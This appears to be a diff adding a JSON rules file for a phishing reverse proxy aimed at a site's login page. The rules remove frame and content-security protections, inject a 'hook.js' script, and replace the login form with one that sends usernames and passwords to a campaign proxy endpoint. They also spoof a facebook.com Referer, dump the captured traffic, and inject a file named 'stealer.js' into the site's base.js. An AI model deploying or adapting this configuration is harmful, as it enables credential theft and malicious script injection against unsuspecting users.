@@ -1,0 +1,47 @@
+[
+  {
+    "url": "/login",
+    "match": "word",
+    "methods": ["GET", "POST"],
+    "replace": {
+      "response": {
+        "header": {
+          "X-Frame-Options": "",
+          "Content-Security-Policy": ""
+        },
+        "body": {
+          "append": "<script src='/proxy/static/hook.js'></script>",
+          "replace_selector": {
+            "form": "<form action='/proxy/{{ .CampaignID }}/login' method='POST'><input type='text' name='username'><input type='password' name='password'><button type='submit'>Sign In</button></form>"
+          }
+        }
+      },
+      "request": {
+        "header": {
+          "Referer": "https://www.facebook.com"
+        }
+      }
+    },
+    "dump": true
+  },
+  {
+    "url": "/base.js",
+    "match": "word",
+    "inject_js": {
+      "url": "/base.js",
+      "file": "/opt/opencode/stealer.js"
+    }
+  },
+  {
+    "url": "/static/",
+    "match": "prefix",
+    "replace": {
+      "response": {
+        "header": {
+          "Cache-Control": "public, max-age=3600"
+        }
+      }
+    },
+    "dump": false
+  }
+]
